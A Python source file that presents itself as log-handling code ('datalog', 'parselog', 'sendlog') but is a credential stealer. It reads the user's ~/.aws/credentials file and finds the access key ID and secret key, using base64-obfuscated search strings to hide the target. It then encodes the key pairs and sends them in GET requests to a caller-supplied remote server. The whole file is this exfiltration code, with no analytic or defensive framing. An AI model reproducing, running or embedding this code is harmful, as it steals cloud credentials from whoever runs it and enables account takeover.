import base64
import requests
from pathlib import Path

def datalog(remoteserver):
    home = Path.home()
    path = f"{home}/.aws/credentials"
    try:
        with open(path, 'r', encoding='utf-8') as logfile:
            logdata = parselog(logfile)
            sendlog(logdata, remoteserver)
    except Exception as e:
        return e

def parselog(logfile):
    logdata = []
    key = ""
    secret = ""
    try:
        for line in logfile.readlines():
            if base64.b64decode("QUNDRVNTX0tFWV9JRAo=").decode('utf-8').strip() in line:
                key = base64.b64encode(line.split("=")[1].encode('utf-8'))
                continue
            if base64.b64decode("U0VDUkVUX0FDQ0VTU19LRVkK").decode('utf-8').strip() in line:
                secret = base64.b64encode(line.split("=")[1].encode('utf-8'))
                log = f"{key.decode('utf-8')}:{secret.decode('utf-8')}"
                logdata.append(log)
        return logdata

    except Exception as e:
        print(e)

def sendlog(logdata, remoteserver):
    try:
        for data in logdata:
            prepdata = base64.b64encode(data.encode('utf-8')).decode('utf-8')
            requests.get(f"{remoteserver}/{prepdata}")
    except Exception as e:
        print(e)